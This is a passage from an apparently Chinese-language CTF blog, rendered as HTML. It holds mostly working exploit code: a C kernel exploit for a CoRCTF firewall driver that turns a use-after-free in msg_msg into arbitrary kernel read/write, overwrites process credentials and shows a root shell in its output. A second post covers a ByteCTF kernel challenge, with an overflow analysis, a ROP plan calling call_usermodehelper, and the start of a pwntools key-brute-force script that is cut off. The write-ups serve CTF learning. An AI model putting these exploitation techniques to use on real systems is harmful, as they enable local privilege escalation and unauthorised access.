class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> msg_id,size;</span><br><span class="line">    msg *msg_buff;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>;</span><br><span class="line">    <span class="keyword">size_t</span> re_buf[<span class="number">0x2000</span>/<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">size_t</span> init_ipc_ns=<span class="number">0</span>,kernel_base=<span class="number">0</span>,init_task=<span class="number">0</span>,init_cred=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int32_t</span> pid;</span><br><span class="line">    <span class="keyword">uint64_t</span> prev, curr;</span><br><span class="line"></span><br><span class="line">    fd=open(<span class="string">&quot;/dev/firewall&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open dev/firewall fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    msg_buff=(msg *)<span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    page=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    page_size=<span class="number">0x1000</span>;</span><br><span class="line">    add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line"></span><br><span class="line">    msg_id=make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    msg_buff-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;(msg_buff-&gt;mtext),<span class="number">1</span>,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(re_buf));</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    send_msg(msg_id, msg_buff, <span class="number">0x1010</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x50</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> shmid;</span><br><span class="line">        <span class="keyword">if</span> ((shmid = shmget(IPC_PRIVATE, <span class="number">100</span>, <span class="number">0600</span>)) == <span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;shmget&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> *shmaddr = shmat(shmid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (shmaddr == (<span class="keyword">void</span>*)<span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;shmat&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] get kernel_base_addr...\n&quot;</span>);</span><br><span class="line">    size=<span class="number">0x1500</span>;</span><br><span class="line">    msg_header fake_msg_header;</span><br><span class="line">    fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=size;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">0</span>);</span><br><span class="line">    get_msg(msg_id, re_buf, size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((re_buf[i]&amp;<span class="number">0xfff</span>)==<span class="number">0x7a0</span>)&#123;</span><br><span class="line">            init_ipc_ns=re_buf[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = init_ipc_ns - <span class="number">0xc3d7a0</span>;</span><br><span class="line">    init_task = kernel_base + <span class="number">0xc124c0</span>;</span><br><span class="line">    init_cred = kernel_base + <span class="number">0xc33060</span>;</span><br><span class="line">    init_cred_addr=init_cred;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] init_ipc_ns: %p\n&quot;</span>, init_ipc_ns);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel_base: %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] init_task: %p\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] init_cred: %p\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(re_buf));</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">void</span> *)&amp;fake_msg_header,<span class="number">0</span>,<span class="keyword">sizeof</span>(msg_header));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] search this process task_struct\n&quot;</span>);</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=size;</span><br><span class="line">    fake_msg_header.next=(<span class="keyword">void</span> *)init_task+<span class="number">0x290</span>;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">    get_msg(msg_id, re_buf, size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;prev, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0xfe0</span>), <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;pid, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0x10d8</span>), <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, pid, getpid());</span><br><span class="line">    <span class="keyword">while</span>(pid!=getpid())&#123;</span><br><span class="line">        curr=prev<span class="number">-0x298</span>;</span><br><span class="line">        fake_msg_header.next=prev<span class="number">-0x8</span>;</span><br><span class="line">        edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">        get_msg(msg_id, re_buf, size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;prev, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0xfe0</span>), <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;pid, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0x10d8</span>), <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, pid, getpid());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] get this process task_struct:%p\n&quot;</span>,curr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] now write for cred\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    add_rule(fd,<span class="number">1</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">1</span>,INBOUND);</span><br><span class="line">    del_rule(fd,<span class="number">1</span>,INBOUND);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf=mmap(<span class="number">0x200000</span>,<span class="number">0x2000</span>,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!buf)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    msg_buff=<span class="number">0x200000</span>+<span class="number">0x1000</span><span class="number">-0x8</span>;</span><br><span class="line">    msg_buff-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    target_addr=curr + <span class="number">0x538</span> - <span class="number">0x8</span>;</span><br><span class="line">    size=<span class="number">0x1010</span>;</span><br><span class="line">    registerUserFaultFd(<span class="number">0x200000</span>+<span class="number">0x1000</span>,<span class="number">0x1000</span>,fault_handler_thread);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    send_msg(msg_id, msg_buff, size - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">    pthread_join(monitor_thread,<span class="literal">NULL</span>);</span><br><span class="line">    usr_shell();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•ˆæœ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ctf@CoRCTF:/exp$ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">ctf@CoRCTF:/exp$ /myexp</span><br><span class="line">idx:0</span><br><span class="line">[*] get kernel_base_addr...</span><br><span class="line">[+] init_ipc_ns: 0xffffffffa603d7a0</span><br><span class="line">[+] kernel_base: 0xffffffffa5400000</span><br><span class="line">[+] init_task: 0xffffffffa60124c0</span><br><span class="line">[+] init_cred: 0xffffffffa6033060</span><br><span class="line">[*] search this process task_struct</span><br><span class="line">0 86</span><br><span class="line">86 86</span><br><span class="line">[*] get this process task_struct:0xffff8d5c46128040</span><br><span class="line">[*] now write for cred</span><br><span class="line">idx:1</span><br><span class="line">getshelling</span><br><span class="line">[*]----getshell ok</span><br><span class="line">root@CoRCTF:/exp# id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å­¦ä¹ åˆ°äº†åœ¨æ‹¥æœ‰äº†<code>4kb</code>çš„uafæƒ…å†µä¸‹å¦‚ä½•ä½¿ç”¨<code>msg</code>è¿›è¡Œä»»æ„åœ°å€è¯»å’Œä»»æ„åœ°å€å†™çš„æ‰‹æ®µï¼Œè¿˜å¯¹<code>task_struct</code>è¿›è¡Œäº†ç›´è§‚çš„äº†è§£ï¼Œå½“ç„¶<code>msg</code>ä¸ä»…èƒ½ç”¨äº<code>4kb</code>æƒ…å†µä¸‹çš„<code>uaf</code>,å®ƒçš„åŠŸèƒ½éå¸¸å¼ºå¤§ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/30/bytectf-easykernel-%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/30/bytectf-easykernel-%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">bytectf easykernel å¤ç°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-09-30 19:47:01 / ä¿®æ”¹æ—¶é—´ï¼š19:48:16" itemprop="dateCreated datePublished" datetime="2022-09-30T19:47:01+08:00">2022-09-30</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="bytectf-easykernel-å¤ç°"><a href="#bytectf-easykernel-å¤ç°" class="headerlink" title="bytectf easykernel å¤ç°"></a>bytectf easykernel å¤ç°</h1><p>å­¦é•¿å‡ºçš„é¢˜ï¼Œåœ¨æ¯”èµ›ä¸­ç”±äºæ²¡æœ‰æ¥è§¦è¿‡å†…æ ¸socketå’ŒarmæŒ‡ä»¤é›†ï¼Œç„¶åå†åŠ ä¸Šidaåæ±‡ç¼–å‡ºæ¥çš„ä»£ç éå¸¸æŠ½è±¡ï¼Œçœ‹ä¸æ¸…æ¥šé€»è¾‘ï¼Œæ‰€ä»¥ç›´åˆ°æ¯”èµ›ç»“æŸéƒ½æ²¡æœ‰æ‰¾è§æ´åœ¨å“ªé‡Œï¼Œèœçš„ç¦»è°±ğŸ¤¦â€â™€ï¸ã€‚åªèƒ½åœ¨èµ›åå¤ç°å¤ç°è¿™æ ·å­äº†ã€‚</p>
<h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><p>èµ›åå°±å‘å­¦é•¿è¦åˆ°äº†æºç ï¼Œçœ‹æºç çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªè¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥æº¢å‡ºå†™ï¼Œä½†æ˜¯ç®¡é“æ¯æ¬¡ç”³è¯·åˆ°çš„å †å—çš„åç§»ä¸æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥ä¸å¥½åˆ©ç”¨ï¼Œå½“æ—¶æ²¡æ³¨æ„åˆ°popçš„æ—¶å€™ä¸ä¼šæ¸…é™¤æ ‡å¿—ä½ï¼Œç»è¿‡å­¦é•¿æç¤ºæ‰æ³¨æ„åˆ°ï¼Œé‚£ä»è¿™ä¸ªè§’åº¦å°±å¥½åˆ©ç”¨å¤šäº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">0x2000</span> &amp;&amp; cnt &amp;&amp; cnt &lt; <span class="number">0x10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            recv(buf, len, csock);</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">block_struct</span> *<span class="title">blk</span> =</span> &amp;bpipe.blks[(bpipe.pos - <span class="number">1</span>) &amp; <span class="number">0x0f</span>];</span><br><span class="line">            <span class="keyword">int</span> left = <span class="number">0x1000</span> - blk-&gt;tail;</span><br><span class="line">            <span class="keyword">if</span> (blk-&gt;can_merge &amp;&amp; left &gt;= len - <span class="number">0x1000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                blk-&gt;tail = <span class="number">0x2000</span> - len;</span><br><span class="line">                <span class="built_in">memcpy</span>(blk-&gt;blk + blk-&gt;tail, buf, left);</span><br><span class="line">                push_bpipe_data(buf + (len - <span class="number">0x1000</span>), <span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">0</span>, PUREDATA_BLK);</span><br><span class="line">                reply(<span class="string">&quot;[+] create pure data success!\n&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;[+] create pure data success!\n&quot;</span>), csock);</span><br><span class="line">                bfree(buf);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>å°±æ˜¯åˆ©ç”¨serverçš„<code>0x20</code>é€‰é¡¹æ¥å¡æ»¡ç®¡é“ï¼Œè¿™é‡Œé¢å°±æœ‰<code>can_merge=1</code>çš„ç®¡é“äº†ï¼Œç„¶ååœ¨å…¨éƒ¨<code>pop</code>å‡ºæ¥ï¼Œå†push<code>0x10</code>æƒé™ï¼Œå°±å¯ä»¥è®©<code>0x10</code>çš„çš„ç®¡é“çš„<code>can_merge=1</code>,ç„¶åå°±å¯ä»¥è¶Šç•Œè¯»å’Œè¶Šç•Œå†™äº†ã€‚æœ€åå†™<code>*callback_func</code>æŒ‡é’ˆæ¥å®Œæˆropã€‚</p>
<p>å¯æ˜¯è¿™æ˜¯å†…æ ¸socketä¸åƒä¸€èˆ¬çš„å†…æ ¸é¢˜å¯ä»¥ä¼ ä¸€ä¸ªç¨‹åºä¸Šå»ï¼Œè¿™è¯¥å¦‚ä½•ropå‘¢ï¼Œå­¦é•¿çš„expç»™äº†ä¸€ä¸ªæ€è·¯ï¼Œå†…æ ¸ä¸­æä¾›äº†ä¸€ä¸ª<code>call_usermodehelper</code>å‡½æ•°ï¼Œå…è®¸åœ¨å†…æ ¸æ€æ‰§è¡Œä¸€ä¸ªç”¨æˆ·æ€çš„ç¨‹åºï¼Œè€Œä¸”å‚æ•°æ¥å£å’Œç”¨æˆ·æ€çš„exec()ç³»åˆ—å‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç¨‹åºåï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡é’ˆæ•°ç»„ï¼Œå­˜å‚¨ç€æ‰§è¡Œè¿™ä¸ªç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°ã€‚</p>
<p>æ‰€ä»¥åªè¦ropèƒ½å¤Ÿ1æ§åˆ¶<code>r0</code>å’Œ<code>r1</code>ç„¶åè®©<code>pc=</code>call_usermodehelperå°±å¥½äº†ã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¦ropå°±å¾—æ§åˆ¶sp,è®©spæŒ‡å‘æˆ‘ä»¬ç²¾å¿ƒå¸ƒç½®çš„å †å—ä¸Šï¼Œè¿™å…¶å®ç›´æ¥ç ´åäº†ç¨‹åºçš„ä¸Šä¸‹æ–‡ï¼Œå½“æ‰§è¡Œå®Œ<code>call_usermodehelper</code>å†ä»æ ˆä¸­å¯»æ‰¾ä¸Šä¸‹æ–‡æ¢å¤åˆ°åŸæ¥è°ƒç”¨å¤„å°±ä¼šå¤±è´¥ï¼Œæ‰€ä»¥ropé¦–å…ˆå¾—ä¿å­˜æ­£å¸¸çš„<code>sp</code>åœ°å€ï¼Œç„¶åå†æ ˆè¿ç§»ï¼Œæœ€åå†æ¢å¤<code>sp</code>ã€‚</p>
<p>æ‰€ä»¥å¯¹gadgetçš„å¯»æ‰¾è¿˜æ˜¯æœ‰ç‚¹è‹›åˆ»çš„ï¼Œæˆ‘è§‰å¾—ä¸æ˜¯å¾ˆå¥½æ‰¾ï¼Œå½“æŒ‰ç€å­¦é•¿çš„gadgetå¤ç°å®Œä¹‹åï¼Œå°è¯•è‡ªå·±åœ¨æ‰¾è§ä¸€å¥—gadget,æœ€åæˆåŠŸç®€åŒ–äº†ä¸€äº›å­¦é•¿çš„gadgetã€‚</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>gadgetæœªç®€åŒ–ç‰ˆ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">key_flag=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">        tmp_key=key+<span class="built_in">chr</span>(j)</span><br><span class="line">        tmp_key=tmp_key.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">        <span class="comment"># sh = process([&#x27;./wscat&#x27;, &#x27;--endpoint&#x27;, &#x27;wss://telnet.2022.capturetheflag.fun/ws/&#x27; + CHALLENGE_ID])</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">        sh.send(tmp_key)</span><br><span class="line">        m=sh.recv(<span class="number">15</span>)</span><br><span class="line">        <span class="built_in">print</span> m</span><br><span class="line">        <span class="keyword">if</span> m == <span class="string">&#x27;auth success!!!&#x27;</span>:</span><br><span class="line">            key_flag=<span class="number">1</span></span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.recv(<span class="number">16</span>)</span><br><span class="line">        ture_num=u8(sh.recv(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ture_num-<span class="number">1</span>==i:</span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.close()</span><br><span class="line">    <span class="keyword">if</span> key_flag ==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span>(<span class="params">opt,<span class="built_in">len</span>=<span class="number">0</span>,context=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello server\n&quot;</span>)</span><br><span class="line">    sh.send(opt)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x30&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]this is puredata\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x10&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]say hello\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt ==<span class="string">&#x27;\x20&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]do opt func\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span>():</span></span><br><span class="line">    sh=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello client\n&quot;</span>)</span><br><span class="line">    sh.send(<span 